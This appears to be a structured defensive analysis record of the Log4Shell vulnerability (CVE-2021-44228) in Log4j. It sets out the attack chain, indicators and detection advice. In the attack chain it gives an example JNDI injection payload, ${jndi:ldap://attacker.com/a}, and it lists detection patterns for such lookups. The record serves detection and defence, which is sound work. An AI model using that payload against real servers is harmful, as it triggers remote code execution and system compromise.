package_info.why_malicious: The Log4j package itself is not intentionally malicious, but it contained a critical zero-day vulnerability (CVE-2021-44228, 'Log4Shell') that allowed attackers to execute arbitrary code remotely. This vulnerability enabled attackers to exploit the logging functionality to trigger remote code execution, leading to widespread exploitation and compromise of systems using vulnerable versions.

execution_context.trigger: runtime (when a log message is processed)
execution_context.file_location: Any Java application log statement processed by vulnerable Log4j versions

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, Log4j performs a JNDI lookup to the specified LDAP server, retrieves a remote Java class via the LDAP protocol, and executes it within the application process, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load/execute remote code, which is highly dangerous and not expected from a logging library. The ability to perform JNDI lookups based on log content exposes the application to remote code execution attacks.
malice_analysis.violated_expectations: Logging libraries are expected to record messages as-is, not to interpret user-controlled input as instructions to fetch and execute code from remote servers. The use of JNDI lookups in log message processing violates the principle of treating log data as passive, non-executable content.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimately used in enterprise Java applications for resource discovery and configuration, but not in the context of processing arbitrary, user-controlled log messages. In normal use, JNDI lookups are performed in controlled code paths, not dynamically triggered by log content.
key_indicators: Presence of ${jndi:...} patterns in log messages or user input
Outbound LDAP, RMI, or other JNDI-related network requests initiated during log processing
Dynamic loading and execution of remote Java classes as a result of log message content
Unexpected JNDI lookups triggered by untrusted or external input

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Log4j processes the message and initiates a JNDI lookup.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled LDAP server as specified in the log message.
attack_chain.leads_to: Retrieval and execution of attacker-supplied Java class (remote code execution).

attack_chain.action: Attacker's code is executed on the victim system with the privileges of the vulnerable application, enabling full compromise.
attack_chain.leads_to: System compromise, data exfiltration, or further lateral movement.

behavioral_signatures: Log messages or user input containing ${jndi:ldap://...}, ${jndi:rmi://...}, or similar patterns
Unexpected outbound LDAP, RMI, or other JNDI-related network requests from application servers during log processing
Runtime loading and execution of remote Java classes triggered by log message content
JNDI lookups initiated from logging code paths
file_indicators: Presence of vulnerable Log4j versions (2.0-beta9 through 2.14.1) in application dependencies (e.g., pom.xml, build.gradle, or dependency trees)
Log files containing suspicious JNDI lookup patterns such as ${jndi:ldap://}
Application configuration files enabling JNDI lookups in Log4j
network_indicators: Outbound LDAP, RMI, or HTTP requests to untrusted or external servers (e.g., attacker.com) during log processing
Connections to domains or IPs not present in normal application operation, especially those specified in log message content
Unusual spikes in outbound connections to LDAP or RMI ports (e.g., 389, 1099) from application servers
detection_knowledge.how_to_detect: Monitor application logs for suspicious JNDI patterns (e.g., ${jndi:ldap://}, ${jndi:rmi://}), audit dependencies for vulnerable Log4j versions (2.0-beta9 through 2.14.1), and alert on unexpected outbound LDAP, RMI, or HTTP requests from application servers, especially those triggered during log processing. Use network monitoring to detect connections to known malicious infrastructure or unexpected external servers. Correlate log message content with network activity to identify exploitation attempts.
